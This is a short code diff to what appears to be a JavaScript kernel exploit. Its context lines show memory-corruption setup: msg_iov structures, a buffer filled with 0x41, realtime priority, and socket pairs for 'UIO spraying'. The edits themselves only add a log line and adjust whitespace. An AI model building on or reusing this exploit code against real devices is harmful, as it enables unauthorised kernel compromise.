@@ -733,6 +733,7 @@ function performSetup() {
         msg.putLong(0x10, msgIov.address()); // msg_iov
         msg.putLong(0x18, MSG_IOV_NUM);      // msg_iovlen
 
+		log("dummy buffer");
         dummyBuffer.fill(0x41);
         uioIovRead.putLong(0x00, dummyBuffer.address());
         uioIovWrite.putLong(0x00, dummyBuffer.address());
@@ -745,10 +746,10 @@ function performSetup() {
         }
 
 		log("set realtime priority");
-      if (!setRealtimePriority(256)) {
+       if (!setRealtimePriority(256)) {
            log("failed realtime priority");
            return false;
-     }
+         }
 		
       log("Create socket pair for UIO spraying");
 		
@@ -1459,6 +1460,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
